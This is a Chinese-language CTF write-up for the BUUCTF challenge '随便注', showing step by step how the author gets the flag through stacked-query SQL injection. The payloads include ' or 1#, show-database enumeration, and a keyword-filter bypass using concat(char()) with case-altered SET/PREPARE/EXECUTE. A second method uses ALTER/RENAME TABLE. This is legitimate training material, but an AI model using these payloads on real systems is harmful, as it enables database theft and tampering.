---
title: BUU 2019/10/19 随便注
date: 2019/10/19
tags: 
	- buuctf
---
### 建立分支试验，未按规定格式书写。

## 进入题目页面
有一个输入框和按钮，html代码里说sqlmap是没有灵魂的，因此手动注入。

## 思路
常规思路，有绕过尝试绕过，无法绕过可以重命名。

## writeup
1.
输入 1
返回

2.
输入'
报错，为字符型注入。

3.
输入' or 1#
```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```
第一个输入1 第二个输入2

4.输入' union select 1,2#
提示：
```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

5.尝试堆查询 ';show databases;#和';show tables;#
猜测自己是在“using ctftraining（数据库）”
```
array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```
6. ';show tables from ctftraining;#
得到
```
array(1) {
  [0]=>
  string(10) "FLAG_TABLE"
}

array(1) {
  [0]=>
  string(4) "news"
}

array(1) {
  [0]=>
  string(5) "users"
}
```
原来自己不在那个库里……
而是在supersqli。

7. ';show columns from `1919810931114514`;#
```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

8. 预处理绕过 ';set @sisi=concat(char(115,101,108,101,99,116)," * from `1919810931114514`");prepare sqla from @sisi;execute sqla;#
返回
```
strstr($inject, "set") && strstr($inject, "prepare")
```
改一下大小写
';Set @sisi=concat(char(115,101,108,101,99,116)," * from `1919810931114514`");Prepare sqla from @sisi;execute sqla;#
得到flag:
```
array(1) {
  [0]=>
  string(42) "flag{86da5891-38c3-4689-8068-5fbb553e6ed8}"
}
```
9. 重命名法
';show columns from `1919810931114514`;#
```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```
只有flag一个column
';alter table `1919810931114514` change flag id varchar(100);# 【一定要加变量类型】
';rename table words to word,`1919810931114514` to words;#
' or 1;#
得到flag。

# 知识点
1. **concat拼接**
2. **SQL预处理**
```
';SET @sql=concat(char(115,101,108,101,99,116)," * from `1919810931114514`");PREPARE sqla from @sql;EXECUTE sqla;#
';set @sisi=concat(char(115,101,108,101,99,116)," * from `1919810931114514`");prepare sqla from @sisi;execute sqla;#
```

